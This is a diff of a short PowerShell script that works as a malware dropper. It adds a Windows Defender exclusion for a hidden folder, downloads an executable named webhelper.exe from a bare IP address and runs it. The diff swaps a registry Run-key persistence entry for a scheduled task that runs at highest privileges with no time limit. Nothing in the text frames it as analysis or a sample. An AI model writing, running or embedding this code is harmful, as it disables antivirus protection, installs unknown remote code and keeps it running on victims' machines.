@@ -3,5 +3,12 @@ mkdir "$env:windir\temp\Cache";
 Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force';
 Invoke-WebRequest -Uri "http://144.172.92.207:3654/main" -OutFile "$env:windir\temp\Cache\webhelper.exe";
 Start-Process "$env:windir\temp\Cache\webhelper.exe";
-New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run" -Name "webhelper" -Value "$env:windir\temp\Cache\webhelper.exe" -PropertyType "String";
-EXIT
+$taskName = "webhelper veloport";
+$exePath = "C:\Windows\Temp\Cache\webhelper.exe";
+$action = New-ScheduledTaskAction -Execute $exePath;
+$trigger = New-ScheduledTaskTrigger -Daily -At 1:00AM;
+$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable;
+$settings.ExecutionTimeLimit = 'PT0S';
+$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest;
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings;
+EXIT;
